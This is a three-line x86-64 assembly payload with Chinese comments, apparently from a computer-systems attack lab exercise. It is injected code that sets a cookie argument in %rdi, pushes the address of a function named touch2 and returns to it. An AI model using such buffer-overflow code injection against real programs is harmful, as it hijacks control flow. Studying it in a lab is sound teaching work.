movq $0x59b997fa, %rdi  # 将cookie值放入%rdi
pushq $0x4017ec         # 将touch2的地址压入栈中
ret                     # 返回，会弹出栈顶的地址并跳转到touch2 